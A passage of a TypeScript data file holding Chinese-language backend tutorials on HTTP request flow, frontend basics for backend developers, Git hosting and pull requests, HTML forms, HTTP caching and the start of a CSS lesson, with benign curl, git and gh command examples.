import type { DeepTutorial } from '../deep-types';

export const BACKEND_DEEP_TUTORIALS: Record<string, DeepTutorial> = {
  // ============================================================
  // 1. Introduction / 入门：互联网基础
  // ============================================================
  "SiYUdtYMDImRPmV2_XPkH": {
    mentalModel: '互联网就像全球快递网络——你的请求是包裹，IP 是门牌号，路由器是分拣中心，HTTP 是快递单格式。后端工程师就是这个庞大物流系统里的"仓库管理员+调度中心"，负责接收订单、处理业务、调取货物（数据）、打包返回。',
    sections: [
      { title: '客户端与服务器：一次请求的完整旅程', content: '客户端（浏览器/App）发起 HTTP 请求，服务器（后端程序）处理并返回响应。一次典型请求的完整链路：\n\n1) 用户在浏览器输入 URL 并回车\n2) 浏览器查 DNS 将域名翻译成 IP 地址\n3) 浏览器与服务器建立 TCP 连接（三次握手）\n4) 如果是 HTTPS，再进行 TLS 加密握手\n5) 浏览器发送 HTTP 请求（请求行 + 请求头 + 可选 Body）\n6) 服务器接收请求，路由到对应的处理函数\n7) 处理函数执行业务逻辑——可能查数据库、调第三方 API、读写缓存\n8) 服务器返回 HTTP 响应（状态行 + 响应头 + Body）\n9) 浏览器接收响应，解析 HTML/CSS/JS 并渲染页面\n\n整个过程通常在 200-500 毫秒内完成。作为后端工程师，你的职责覆盖步骤 6-8，但你需要理解全链路才能排查问题。' },
      { title: '后端在系统中的角色定位', content: '后端是系统的"大脑"和"数据守门人"。具体职责：\n\n1) 接收与验证：解析请求参数，校验合法性（格式/权限/业务规则）\n2) 业务逻辑：执行核心计算、状态流转、规则判断\n3) 数据存取：与数据库（关系型/文档型/缓存）交互\n4) 响应构造：序列化为 JSON/XML/HTML 返回\n5) 横切关注点：日志记录、性能监控、安全防护、限流熔断\n\n前端只管"展示"和"交互"，后端管"数据"和"逻辑"。这个分工看似简单，但理解其边界是所有后端设计的基础。' },
      { title: '理解"请求-响应"模型的局限性', content: '传统的 HTTP 请求-响应模式是"客户端问、服务器答"。但在现代应用中，这个模型不够用：\n\n1) 实时推送：服务端需要主动通知客户端（WebSocket/SSE）\n2) 长时间任务：上传大文件、生成报表不能同步等待（异步任务+轮询/回调）\n3) 服务间调用：微服务之间通过 gRPC/消息队列通信，不是简单的请求-响应\n\n作为新手，先精通请求-响应模式（覆盖 80% 场景），再逐步学习其他通信模式。' },
    ],
    handsOn: [
      { title: '用 curl 观察一次完整的 HTTP 请求-响应', cmd: 'curl -v https://httpbin.org/get?name=backend', output: '* Connected to httpbin.org (54.208.149.222) port 443\n* ALPN: h2\n* SSL connection using TLSv1.3\n> GET /get?name=backend HTTP/2\n> Host: httpbin.org\n> user-agent: curl/8.4.0\n> accept: */*\n>\n< HTTP/2 200\n< content-type: application/json\n<\n{ "args": { "name": "backend" }, "headers": {...}, "url": "..." }', explain: '> 开头的行是请求（request），< 开头的行是响应（response）。注意 IP 解析、TLS 握手、HTTP/2 协议协商都是自动完成的。httpbin 是一个调试利器——它会回显你发送的一切。' },
      { title: '查看请求各个环节的耗时分布', cmd: 'curl -s -o /dev/null -w "DNS解析: %{time_namelookup}s\nTCP连接: %{time_connect}s\nTLS握手: %{time_appconnect}s\n首字节: %{time_starttransfer}s\n总耗时: %{time_total}s\n" https://httpbin.org/get', output: 'DNS解析: 0.005s\nTCP连接: 0.098s\nTLS握手: 0.156s\n首字节: 0.312s\n总耗时: 0.313s', explain: '-w 参数输出详细性能指标。首字节时间（TTFB）= 服务器处理时间，是后端性能的核心指标。总耗时 - 首字节 = 数据传输时间，取决于响应体大小和带宽。' },
    ],
    diagnosis: [
      { symptom: '浏览器显示"无法访问此网站"（ERR_CONNECTION_REFUSED）', cause: '服务器没有在目标端口监听，或防火墙拦截了连接。常见于服务器宕机、应用未启动、端口号写错。', fix: '1) 在服务器上执行 netstat -tlnp | grep PORT 确认端口在监听 2) 检查防火墙规则（iptables/安全组）3) curl localhost:PORT 测试本地是否可达 4) 检查应用日志看是否正常启动。' },
      { symptom: '页面加载很慢，白屏超过 3 秒', cause: '性能瓶颈可能出现在任一环节：DNS 解析慢（换 DNS 服务商）、TCP 握手慢（服务器在国外）、TLS 握手慢（证书链过长）、服务器处理慢（数据库慢查询）、响应体过大（未压缩）。', fix: '用 Chrome DevTools Network 面板看每个请求的瀑布图，定位瓶颈环节。或用 curl -w 参数逐个排除。TTFB 长 = 后端慢，Download 长 = 资源太大。' },
      { symptom: 'curl 能通但浏览器打不开', cause: '可能是浏览器扩展拦截、代理配置错误、系统时间不对导致证书验证失败、或 HSTS 策略冲突。', fix: '1) 无痕模式测试（排除扩展影响）2) 检查系统时间和时区 3) chrome://net-internals/#dns 清除 DNS 缓存 4) curl -v 对比浏览器发出的请求差异。' },
    ],
    exercises: [
      { level: '基础', task: '用 curl 访问 https://api.github.com，观察返回的 JSON 结构中有哪些字段', hint: 'curl https://api.github.com | python3 -m json.tool', answer: '返回 JSON 包含 current_user_url、repository_url、user_search_url 等字段。这是 GitHub API 的"根目录"，描述 API 的入口点。' },
      { level: '进阶', task: '用 curl -v 对比访问 HTTP 和 HTTPS 版本的同一网站，找出请求和响应头中的差异', hint: 'curl -v http://httpbin.org/get vs curl -v https://httpbin.org/get', answer: 'HTTPS 版本会额外有一段 TLS 握手日志（* ALPN、* Server certificate 等）。响应头方面，HTTP 版本可能被重定向到 HTTPS（301/302 + Location 头）。' },
      { level: '挑战', task: '用 curl -w 模板测量你访问最常用的 5 个网站的 TTFB（首字节时间），分析哪个最快、哪个最慢、为什么', hint: 'curl -s -o /dev/null -w "%{url_effective}: %{time_starttransfer}s\\n" URL1 URL2 ...', answer: '国内网站通常 TTFB < 100ms（服务器在国内），国外网站可能 200-500ms。CDN 能显著降低 TTFB。这个指标就是用户体验的核心——Google 建议 TTFB < 200ms。' },
    ],
  },

  // ============================================================
  // 2. Frontend Basics / 前端基础（能看懂即可）
  // ============================================================
  "oyg5g4-cY5EBEUgVkjnL3": {
    mentalModel: '前端就像餐厅的服务员——把菜（数据）端给客人（用户），但做菜（业务逻辑）是后厨（后端）的事。后端需要懂前端，就像厨师也需要了解菜是怎么端上桌的：知道盘子大小（屏幕尺寸）、上菜顺序（页面渲染）、客人怎么点菜（用户交互）。',
    sections: [
      { title: '后端为什么需要懂前端基础', content: '这不是为了抢前端的饭碗，而是为了：\n\n1) API 设计从前端视角出发：前端需要什么格式的数据？一次请求够不够还是需要 N+1 次？字段嵌套多深合适？\n2) 联调效率：能看懂浏览器 Console 报错、Network 面板的请求详情，定位问题是前端还是后端\n3) 安全理解：XSS（跨站脚本攻击）的根源是浏览器执行了不可信的脚本；CSRF（跨站请求伪造）利用了浏览器自动带 Cookie 的特性；CORS 是浏览器的同源策略限制——这些全是前端机制\n4) 全栈趋势：越来越多的后端岗位要求"能写简单的前端页面"，不要求精美但要能跑\n\n你不需要成为前端专家，但要达到"看得懂代码，调得了接口，说得出问题在哪"的水平。' },
      { title: '后端需要掌握到什么程度（精确标准）', content: '最低要求（必须）：\n1) 能读懂 HTML 表单——知道 action、method、input name 分别对应后端的什么\n2) 理解 JavaScript 如何发 HTTP 请求——fetch()/axios 的基本用法和异步特性\n3) 理解 JSON——它是前后端的数据"通用语言"\n4) 会用浏览器 DevTools 的 Network（查看请求详情）和 Console（查看错误）面板\n5) 理解 DOM 和事件——知道用户点击按钮后发生了什么\n\n加分项（建议学）：\n1) 能写简单的 HTML + JS 页面来测试自己写的 API\n2) 理解单页应用（SPA）的路由和数据流\n3) 了解 React/Vue 的组件化思想\n\n不需要（别浪费时间）：\n1) CSS 动画、响应式布局、设计感\n2) Webpack/Vite 等构建工具配置\n3) 各种前端框架的深入原理' },
      { title: '前后端分离与不分离', content: '传统模式（服务端渲染 SSR）：后端用模板（Jinja2/EJS/Thymeleaf）直接生成 HTML，浏览器只负责展示。优点：SEO 友好、首屏快。缺点：前后端耦合、交互体验差。\n\n现代模式（前后端分离）：后端只提供 JSON API，前端用 React/Vue 渲染页面。优点：前后端独立开发部署、交互体验好。缺点：SEO 需要额外处理（SSG/SSR）、首屏可能慢。\n\n很多项目是混合的：核心页面 SSR（首页/详情页），管理后台 SPA（功能交互多）。作为后端，两种模式都要能应对。' },
    ],
    handsOn: [
      { title: '观察前端如何发请求到后端', cmd: `# 打开浏览器 DevTools,切换到 Network 面板\n# 过滤 XHR/Fetch 请求,刷新任意网站\n# 找一个 XHR 请求,查看以下内容:\n# - Request URL (请求的地址)\n# - Request Method (GET/POST/PUT/DELETE)  \n# - Status Code (200/404/500 等)\n# - Response (返回的 JSON 数据)\n# - Request Headers (Content-Type, Authorization 等)`, output: '(浏览器 DevTools 交互,无终端输出)', explain: '这个练习的目的是建立"前端代码 → HTTP 请求 → 后端接收"的对应关系。当你看前端代码中的 fetch("/api/users") 时，脑子里自动映射到后端的 GET /api/users 路由。这是前后端联调的"翻译能力"。' },
    ],
    diagnosis: [
      { symptom: '前端说"接口返回了 404"但后端日志显示请求没有被打印', cause: '请求根本没到后端——可能是前端请求的 URL 写错了（端口/路径）、被浏览器跨域拦截（CORS 预检失败）、或被代理/网关拦截。', fix: '1) 在浏览器 Network 面板看请求是否真的发出了（Status 显示 "(failed)" 说明被拦截）2) 检查 CORS：看 Console 是否有跨域报错 3) 对比前端代码中的 URL 和后端路由定义是否一致 4) 检查 Nginx/网关配置。' },
      { symptom: '前端收到 200 OK 但数据渲染出错（报 "xxx is undefined"）', cause: '后端返回的 JSON 结构和前端期望的不一致——字段名拼写错误、嵌套层级不对、数据类型不符（期望数组拿到 null）。', fix: '1) 在 Network 面板看 Response 的实际内容 2) 和前端对齐 API 文档的字段定义 3) 后端用 JSON Schema 校验响应格式 4) 前后端约定 null vs 空数组的使用规则。' },
    ],
    exercises: [
      { level: '基础', task: '打开任意网站的 DevTools Network 面板，找到一个 XHR/Fetch 请求，记录它的 Request URL、Method、Status Code 和 Response 类型', hint: 'F12 → Network → 筛选 XHR/Fetch → 点击请求 → Headers/Response 标签', answer: '例如访问 GitHub，在 Network 中会看到大量对 api.github.com 的请求。选一个看详情，你会发现实际的后端 API 就长这样——JSON 格式、各种 header、明确的状态码。这就是你未来要写的代码。' },
      { level: '进阶', task: '写一个只有 10 行的 HTML 文件，用 fetch 调用一个公开 API（如 https://jsonplaceholder.typicode.com/posts/1），把返回的 title 显示在页面上', hint: '<script>fetch(url).then(r=>r.json()).then(d=>document.body.innerHTML=d.title)</script>', answer: `<html><body><script>fetch('https://jsonplaceholder.typicode.com/posts/1').then(r=>r.json()).then(d=>{document.body.innerHTML='<h1>'+d.title+'</h1>'})</script></body></html>。保存为 .html 双击打开即可看到效果。这 10 行就是前后端交互的最小原型。` },
    ],
  },

  // ============================================================
  // 3. Repo Hosting Services / 代码托管平台
  // ============================================================
  "NvUcSDWBhzJZ31nzT4UlE": {
    mentalModel: '代码托管平台就像代码的"云盘+协作办公室"——不仅能存代码，还能管版本（谁改了啥）、审代码（PR/MR 互相审查）、自动部署（CI/CD 流水线）。GitHub 就是全球最大的程序员办公室，每天有几千万人在上面协作。',
    sections: [
      { title: '三大主流平台深度对比', content: 'GitHub（微软，2008 年创立）：全球最大开源社区，2024 年 1 亿+ 开发者。核心优势：Actions（CI/CD 免费额度充足）、Copilot（AI 编程助手集成）、最大的开源项目库（几千万项目）。生态最强，新手必选。\n\nGitLab（独立公司，2011 年创立）：主打 DevOps 全流程（从代码到部署一站式）。核心优势：自建（Self-hosted）能力强（企业内网部署）、CI/CD 功能更全面、内置容器注册表和 K8s 集成。很多大公司用 GitLab 部署在内网。\n\nBitbucket（Atlassian，2008 年创立）：与 Jira/Confluence/Trello 深度集成。核心优势：对 Atlassian 生态用户无缝、支持 Mercurial（虽然已停止）。市场份额逐年缩小。\n\n对个人开发者：GitHub = 公开简历。你的 GitHub Profile 上展示的项目、Contribution 热力图、Star 仓库，是大厂筛简历的参考之一。' },
      { title: 'Pull Request / Merge Request 全流程', content: 'PR（Pull Request，GitHub 叫法）或 MR（Merge Request，GitLab 叫法）是代码协作的核心机制。\n\n标准流程：\n1) 从 main/master 分支创建一个 feature 分支\n2) 在 feature 分支上开发、提交（小步提交，一个 commit 做一件事）\n3) Push 到远程仓库\n4) 在平台上创建 PR/MR，填写描述（做了什么、为什么、怎么测的）\n5) 自动触发 CI 流水线（跑测试、lint、构建检查）\n6) 指定 Reviewer（同事）进行 Code Review\n7) 根据 Review 意见修改并 Push（PR 自动更新）\n8) 所有 CI 检查通过 + Reviewer 批准后，合并到主分支\n\nPR 不只是"合并代码"——它是知识传递（新人看老代码的修改过程）、质量把控（多人审查减少 bug）、团队协作（异步沟通不受时区限制）的核心载体。好的 PR 描述应该让 Reviewer 不需要看代码就能理解上下文。' },
      { title: 'CI/CD 入门', content: 'CI（持续集成，Continuous Integration）：每次 Push/PR 自动运行测试、lint、类型检查、安全扫描。目的：尽早发现问题，不积累 bug。\n\nCD（持续部署/交付，Continuous Deployment/Delivery）：CI 通过后自动部署到测试环境（Delivery）或直接部署到生产（Deployment）。\n\nGitHub Actions 配置示例要点：\n- 触发条件：on: push / on: pull_request / on: schedule\n- 运行环境：runs-on: ubuntu-latest\n- 步骤：actions/checkout（检出代码）→ 安装依赖 → 跑测试 → 构建 → 部署\n- 密钥管理：用 GitHub Secrets 存储敏感信息（Token/密码）\n\n新手建议：每个项目至少配一个"Push 自动跑测试"的 CI，这是工程化的第一步。' },
    ],
    handsOn: [
      { title: '用 gh CLI 创建仓库并发起 PR（完整流程）', cmd: `# 1. 克隆仓库
git clone git@github.com:yourname/my-project.git
cd my-project

# 2. 创建 feature 分支
git checkout -b feature/add-readme

# 3. 修改代码
echo "# My Project" > README.md
git add README.md && git commit -m "docs: add README"

# 4. Push 并创建 PR
git push -u origin feature/add-readme
gh pr create --title "docs: add project README" --body "添加项目说明文档，包含简介和快速开始。"`, output: 'https://github.com/yourname/my-project/pull/1', explain: 'gh 是 GitHub 官方 CLI 工具（brew install gh）。整个流程从创建分支到发起 PR 一气呵成。gh pr create 会自动识别当前分支并推送到远程。' },
      { title: '查看一个开源项目的 PR 历史', cmd: `# 查看 express.js 项目的最近 PR
gh pr list --repo expressjs/express --limit 5 --state merged`, output: 'ID   TITLE                              STATE    CREATED\n#5678 fix: handle undefined req body    MERGED   2024-01-15\n#5677 feat: add rate-limit option        MERGED   2024-01-14', explain: '浏览知名项目的 PR 是学习的最佳途径之一。你可以看到真实世界中的代码变更上下文、Review 讨论、以及最终如何解决。这比任何教程都更有价值。' },
    ],
    diagnosis: [
      { symptom: 'git push 报 "Permission denied (publickey)"', cause: '本地没有配置 SSH Key，或者 Key 没有添加到 GitHub/GitLab 账户中。', fix: '1) ssh-keygen -t ed25519 -C "your@email.com" 生成密钥对 2) cat ~/.ssh/id_ed25519.pub 复制公钥 3) GitHub Settings → SSH and GPG keys → New SSH Key 粘贴 4) ssh -T git@github.com 测试连接是否成功。' },
      { symptom: 'PR 提交后 CI 一直卡在 Pending/Running 不结束', cause: '可能是仓库的 Actions 配额用完了（私有仓库免费 2000 分钟/月）、某个 job 死循环了、或 GitHub 服务异常。', fix: '1) 检查 Actions 页面看具体哪个 job 卡住了 2) Settings → Billing 查看剩余额度 3) 如果 job 无限等待（如等待审批但没审批人），取消后重新触发 4) 确认 workflow 文件没有语法错误。' },
      { symptom: 'Merge 时出现大量冲突（Conflict），不敢处理', cause: '分支长期没有同步主分支的更新，导致和主分支的差异越积越大。', fix: '1) 不要直接在 GitHub UI 上解决大冲突 2) 本地执行 git merge main（把主分支合并到当前分支）3) 用 git mergetool 或 IDE 的冲突解决工具逐一处理 4) 解决后 git add . && git commit 5) Push 后 PR 自动更新。预防：每天 git pull origin main 一次。' },
    ],
    exercises: [
      { level: '基础', task: '在 GitHub 上创建新仓库，克隆到本地，添加一个 README.md，push 回去', hint: 'GitHub 右上角 + → New repository → 不要勾选 Add README（留空）→ 按页面提示操作', answer: '创建空仓库后，GitHub 会显示操作指引：echo "# repo" >> README.md → git init → git add README.md → git commit -m "first commit" → git remote add origin git@github.com:you/repo.git → git push -u origin main。' },
      { level: '进阶', task: 'Fork 一个你感兴趣的开源项目，阅读它的 CONTRIBUTING.md，然后尝试修复一个简单的 issue（如修正错别字、补充注释）并发起 PR', hint: 'Fork → git clone → git checkout -b fix-typo → 修改 → commit → push → GitHub 上点 New Pull Request', answer: '在项目的 Issues 页面找带有 "good first issue" 或 "help wanted" 标签的。从改文档错别字开始最安全——流程完整走一遍，熟悉 OSS 协作规范。' },
      { level: '挑战', task: '为你自己的项目配置 GitHub Actions：Push 到 main 分支时自动运行测试', hint: '创建 .github/workflows/test.yml，用 actions/checkout 和对应语言的 setup 动作', answer: 'Node.js 示例：使用 actions/checkout@v4 + actions/setup-node@v4，然后 npm ci && npm test。Go 示例：使用 actions/setup-go@v5 + go test ./...。每次 Push 后去 Actions 标签页看运行结果。' },
    ],
  },

  // ============================================================
  // 4. HTML / 页面结构
  // ============================================================
  "9-pCsW650T1mfj5dmRB9L": {
    mentalModel: 'HTML 是网页的"骨架"——标签就像骨骼，给内容赋予结构。后端工程师不需要画皮（CSS 美观）和装神经（JS 交互），但必须认得骨架，因为后端返回的许多内容最终会被组装进这个骨架里。',
    sections: [
      { title: '后端必懂的 HTML 元素与后端映射', content: '以下元素直接关系到后端如何处理请求：\n\n1) <form> 表单——最重要的元素\n   - action="/login"：提交到的 URL，对应后端的 POST /login 路由\n   - method="GET|POST"：GET 参数在 URL 里，POST 在请求体里\n   - enctype="multipart/form-data"：上传文件必须设置此项\n\n2) <input> 输入框\n   - name="username"：提交时这个值会成为 key（后端 req.body.username）\n   - type="text|password|email|number|file"：影响客户端的输入行为\n   - 一个没有 name 属性的 input 不会被提交！\n\n3) <a href="/page"> 链接——对应后端 GET 请求，通常返回新页面\n\n4) <select> / <textarea>：下拉框和多行文本，同样靠 name 属性传值\n\n5) <script> / <link>：引用 JS/CSS 资源，后端可能需要配置静态文件服务' },
      { title: 'HTML 与后端两种交付模式', content: '模式一：服务端渲染（SSR —— Server-Side Rendering）\n后端直接用模板引擎（Jinja2/EJS/Thymeleaf/Go template）生成完整 HTML 返回。浏览器拿到的是完整的页面，不需要额外请求。\n\n示例（Express + EJS）：\nres.render("user", { name: "张三", posts: [...] })\n// 模板中: <h1><%= name %></h1>\n// 渲染后: <h1>张三</h1>\n\n模式二：API + 前后端分离\n后端只返回 JSON，前端用 React/Vue 在浏览器中生成 HTML：\nres.json({ name: "张三", posts: [...] })\n\n实际项目常见混合模式：首页/详情页 SSR → 快 + SEO 好。管理后台/交互密集 SPA → 体验好。CRUD API 返回 JSON → 给移动端也通用。' },
      { title: 'HTML 安全：后端不可忽视的前端安全基础', content: 'XSS（跨站脚本攻击）的本质：用户提交的恶意数据被嵌入 HTML 页面并执行。\n\n后端防护要点：\n1) 输出转义：所有用户数据在插入 HTML 前必须转义（< 变成 &lt;，> 变成 &gt;）\n2) 不要用 innerHTML：前端操作 DOM 时优先用 textContent\n3) Content-Security-Policy 响应头：限制页面可以加载/执行的资源来源\n4) HttpOnly Cookie：Cookie 标记为 HttpOnly 后 JS 无法读取（防 XSS 窃取 Cookie）\n\n这些安全措施虽然最终作用在浏览器，但都需要后端配合设置。' },
    ],
    handsOn: [
      { title: '创建一个完整表单，理解每个属性如何影响后端接收', cmd: `cat > /tmp/form-demo.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<body>
  <h2>用户注册</h2>
  <!-- POST /register → 后端接收 body: username=xxx&password=xxx -->
  <form action="/register" method="POST">
    <label>用户名: <input name="username" required></label><br>
    <label>密码: <input name="password" type="password" required></label><br>
    <label>性别:
      <select name="gender">
        <option value="male">男</option>
        <option value="female">女</option>
      </select>
    </label><br>
    <!-- 上传文件必须加 enctype="multipart/form-data" -->
    <label>头像: <input name="avatar" type="file"></label><br>
    <button type="submit">注册</button>
  </form>
</body>
</html>
HTMLEOF
echo "文件已创建: /tmp/form-demo.html"`, output: '文件已创建: /tmp/form-demo.html', explain: '打开这个文件，填写并提交。你会看到浏览器地址栏变化（GET 的话）或页面刷新（POST 的话）。检查 Network 面板中的 Form Data 部分，就是后端实际收到的数据格式。' },
    ],
    diagnosis: [
      { symptom: '后端收不到表单字段的值（req.body.xxx 是 undefined）', cause: '常见原因：1) input 少了 name 属性 2) Content-Type 不匹配（表单是 application/x-www-form-urlencoded 但后端 middleware 期望 JSON）3) 前端 JS 拦截了 submit 事件但没处理。', fix: '1) 检查前端 HTML 每个 input 是否有 name 属性 2) 检查浏览器 Network 面板的 Request Headers 中 Content-Type 是否正确 3) 检查后端是否配置了对应的 body parser（urlencoded/json/multipart）。' },
      { symptom: '文件上传失败，后端报 "Unexpected end of form" 或类似错误', cause: 'form 标签缺少 enctype="multipart/form-data"；或者后端文件上传中间件配置的 size limit 太小。', fix: '1) HTML 中 form 标签加 enctype="multipart/form-data" 2) 后端文件上传中间件检查 maxFileSize 配置（Express multer: limits.fileSize）3) 检查 Nginx 的 client_max_body_size 是否够大。' },
    ],
    exercises: [
      { level: '基础', task: '写一个 HTML form，GET 提交到 /search，包含一个 q 参数和一个 category 下拉，形如 /search?q=关键词&category=书籍', hint: 'method="GET" + input name="q" + select name="category"', answer: '<form action="/search" method="GET"><input name="q" placeholder="搜索"><select name="category"><option value="book">书籍</option><option value="movie">电影</option></select><button>搜索</button></form>。GET 请求的参数直接拼在 URL 后面。' },
      { level: '进阶', task: '用浏览器 DevTools 修改某个网站的登录表单，把 type="password" 改成 type="text"，观察密码是否明文显示', hint: 'F12 → Elements → 找到 <input type="password"> → 双击 type 属性 → 改成 text', answer: '密码输入框会变成明文显示。这说明：1) input type 只是前端视觉效果，不影响后端安全性 2) 任何人都可以修改前端代码 3) 所有的安全校验必须在后端再做一次——永远不要信任前端发来的数据。' },
    ],
  },

  // ============================================================
  // 5. HTTP Caching / HTTP 缓存
  // ============================================================
  "KWTbEVX_WxS8jmSaAX3Fe": {
    mentalModel: 'HTTP 缓存就像把常用工具放在桌面上而不是每次都跑仓库去取——省了来回跑的时间，但要注意"工具是不是过时了"。Cache-Control 就是这个工具的"保质期标签"，ETag 是"版本号"。后端工程师负责给每个资源贴上正确的标签，少贴或多贴都会出问题。',
    sections: [
      { title: '缓存核心 Header 详解', content: 'Cache-Control（控制缓存行为）：\n- max-age=3600：资源可缓存 3600 秒，期间不发起请求，直接用缓存\n- public：允许中间节点（CDN/代理）缓存。公开数据（图片/CSS/JS/新闻列表）用这个\n- private：只允许终端浏览器缓存。用户私有数据（个人信息/订单）用这个\n- no-cache：每次必须先验证（发起请求但可能收到 304 Not Modified），不能直接用\n- no-store：完全禁止缓存——银行页面/支付信息等敏感场景\n- must-revalidate：缓存过期后必须验证，不能直接使用过期缓存\n\nETag / If-None-Match（内容版本号）：\n服务器在响应中返回 ETag: "abc123"（通常是文件内容的哈希）。下次浏览器请求时带上 If-None-Match: "abc123"。如果内容没变，服务器返回 304 Not Modified（空 body，省带宽）。如果变了，返回 200 + 新内容 + 新 ETag。\n\nLast-Modified / If-Modified-Since（时间版本号）：\n类似 ETag 但基于文件修改时间，精度只有秒级。一秒内多次修改可能检测不到。现在优先用 ETag（基于内容，可靠性高）。' },
      { title: '缓存的四级位置（由近到远）', content: '1) 浏览器缓存（Memory/Disk Cache）：存在用户本地，最快但只服务一个用户。由 Cache-Control: private 控制。\n\n2) 反向代理缓存（Nginx proxy_cache / Varnish）：部署在服务器前面，缓存常用响应。命中率高时可减少 90% 的服务器负载。\n\n3) CDN 边缘缓存（Cloudflare/AWS CloudFront/阿里云 CDN）：全球分布的边缘节点，用户请求就近返回。由 Cache-Control: public 控制。CDN 缓存的是"整个 HTTP 响应"包括 Header 和 Body。\n\n4) 应用层缓存（Redis/Memcached）：后端的"程序化缓存"，缓存的是数据片段（数据库查询结果、计算结果），不是完整 HTTP 响应。灵活度最高但需要手写代码管理。\n\n后端设计 API 时，要逐接口明确：数据能被缓存在哪一级？缓存 Key 是什么？过期时间多长？什么事件触发缓存失效？' },
      { title: '缓存失效——最难的从来不是"怎么存"而是"什么时候删"', content: 'Phil Karlton 名言："计算机科学中只有两件难事：缓存失效和命名。"\n\n常见缓存策略：\n\n1) TTL 过期（最简单）：设定固定过期时间。优点：实现简单。缺点：数据更新后，TTL 到期前用户看到的都是旧数据。适合：不常变的配置数据、新闻列表（晚几分钟不要紧）。\n\n2) 主动失效/Cache-Aside（最常用）：\n   - 读：查缓存 → 没有就查数据库 → 写入缓存 → 返回\n   - 写：更新数据库 → 删除缓存（不是更新缓存！）→ 下次读时重建\n   - 为什么是"删除"而不是"更新"？因为并发写时"更新缓存"可能写入过期数据\n\n3) 写穿透（Write-Through）：写操作同时更新缓存和数据库。一致性好但写入延迟高。\n\n4) 写后（Write-Behind）：异步更新缓存和数据库。写入快但有数据丢失风险。\n\n后端经典 Bug：改了数据库但忘了删 Redis 缓存 → 用户看到旧数据 → 清缓存立刻正常 → 过一段时间又出问题（定时任务重新写了旧数据进缓存）。' },
    ],
    handsOn: [
      { title: '用 curl 观察缓存的完整交互过程', cmd: `# 第一次请求（200，返回 ETag）
curl -v https://httpbin.org/etag/test 2>&1 | grep -E "HTTP/|ETag|Cache"

# 第二次请求（带上 ETag，返回 304）
curl -v -H "If-None-Match: \\"test\\"" https://httpbin.org/etag/test 2>&1 | grep -E "HTTP/|ETag|Cache"`, output: '< HTTP/2 200\n< etag: "test"\n\n< HTTP/2 304\n< etag: "test"', explain: '第一次返回 200 + ETag + 完整 body。第二次带上 ETag 后返回 304 Not Modified，body 为空，节省了传输。这就是浏览器缓存的工作原理。' },
    ],
    diagnosis: [
      { symptom: '用户反馈"改了数据但刷新页面看到的是旧数据"', cause: '缓存未失效——可能是浏览器缓存了旧版本（Ctrl+F5 强制刷新验证）、CDN 缓存未更新、或 Redis 缓存未清除。', fix: '1) 确认是哪层缓存：Chrome DevTools → Network → 看 Size 列显示 "disk cache" 还是 "memory cache" 2) CDN 后台做 Purge（清除）操作 3) Redis 中 DEL 对应 Key 4) 检查数据更新的业务代码是否遗漏了缓存清除逻辑。' },
      { symptom: '生产环境部署了新版本 JS/CSS，但用户还在加载旧文件', cause: '静态资源的缓存时间设置过长（如 max-age=31536000 一年），且文件名没有版本号，用户浏览器不会请求新文件。', fix: '1) 构建工具（Webpack/Vite）配置 output filename 包含 contenthash：app.a1b2c3d.js 2) HTML 页面用短缓存（no-cache）保证索引页每次都验证 3) 已部署的旧文件：在 CDN 层面做批量 Purge 或等待过期。' },
      { symptom: 'API 返回了旧数据，但数据库里明明已经更新了', cause: '应用层缓存（Redis）中的数据未失效。常见场景：定时任务把数据库数据全量刷到 Redis，但某个业务操作更新了数据库后没有删除对应 Redis Key。', fix: '1) 在设计阶段就明确"哪些写操作会影响哪些缓存 Key"——用表格列出映射关系 2) 统一使用缓存装饰器/中间件，避免散落的缓存操作代码 3) 监控：对比数据库和缓存的数据，报警不一致情况。' },
    ],
    exercises: [
      { level: '基础', task: '用 curl -I 分别访问百度首页和一个图片 CDN 地址，对比它们的 Cache-Control 头有什么区别', hint: 'curl -I https://www.baidu.com 和 curl -I 任意图片 URL', answer: '百度首页通常 cache-control: max-age=0 或 private（内容动态变化不能缓存久），图片 CDN 通常 cache-control: public, max-age=31536000（静态资源缓一年）。这两者的策略完全不同。' },
      { level: '进阶', task: '设计一个博客系统文章列表的缓存策略：文章修改后 1 分钟内必须生效，正常访问要尽可能快', hint: '用 Cache-Control + CDN purge + 应用层 Cache-Aside', answer: '1) GET /posts 返回 Cache-Control: public, max-age=60 + ETag 2) PUT /posts/:id 更新文章后，发送 CDN purge 请求清除 /posts 缓存，并 DEL Redis key "posts:list" 3) Redis 中缓存文章详情 key（posts:123 → JSON），TTL 10 分钟，更新时主动删除。这样保证更新后最多 1 分钟 CDN 缓存重建，Redis 立即可见。' },
      { level: '挑战', task: '在你的项目中实现一个"缓存装饰器"：自动根据函数名和参数生成 Redis Key，处理缓存的读取和写入', hint: '封装一个函数，接收原始函数，返回包装后的函数。先查缓存，命中返回，miss 执行原函数并存缓存', answer: 'function cacheable(redis, ttl) { return function(fn) { return async function(...args) { const key = fn.name + ":" + JSON.stringify(args); const cached = await redis.get(key); if (cached) return JSON.parse(cached); const result = await fn(...args); await redis.setex(key, ttl, JSON.stringify(result)); return result; }; }; }。这样业务代码只需 @cacheable(redis, 300) 就自动有缓存能力。' },
    ],
  },

  // ============================================================
  // 6. CSS / 样式基础
  // ============================================================
  "utA1W2O6pzoV_LbtDE5DN": {
    mentalModel: 'CSS 是网页的"衣服和妆容"——换一套 CSS，同一个 HTML 可以变成完全不同的样子（专业网站 vs 复古博客 vs 极简白底）。后端只需要会选衣服（识别基本样式），不需要会设计（精通 CSS 布局动画）。',
    sections: [
      { title: '后端需要知道的 CSS 核心概念', content: '1) 选择器（Selector）——"选中谁"：\n   - .class（类选择器，最常用）：.error { color: red; } 选中所有 class="error"\n   - #id（ID 选择器，唯一性）：#header { height: 60px; } 选中 id="header"\n   - element（标签选择器）：p { line-height: 1.5; } 选中所有 <p>\n   - 组合：form input[type="text"] 选中表单中的文本输入框\n\n2) 盒模型（Box Model）——"一个元素占多少空间"：\n   从外到内：margin（外边距，推开邻居）→ border（边框）→ padding（内边距，推开内容）→ content（内容本身）\n   宽度实战：width: 300px + padding: 20px + border: 2px = 实际占 344px\n\n3) 显示模式：\n   - display: block——独占一行（div/p/h1）\n   - display: inline——不换行（span/a）\n   - display: flex/grid——弹性/网格布局（现代布局主力）\n   - display: none——完全隐藏（不占空间）vs visibility: hidden（占空间但不可见）\n\n4) 响应式设计：@media (max-width: 768px) {} 当屏幕宽度小于 768px 时生效。这是移动端适配的基石。' },
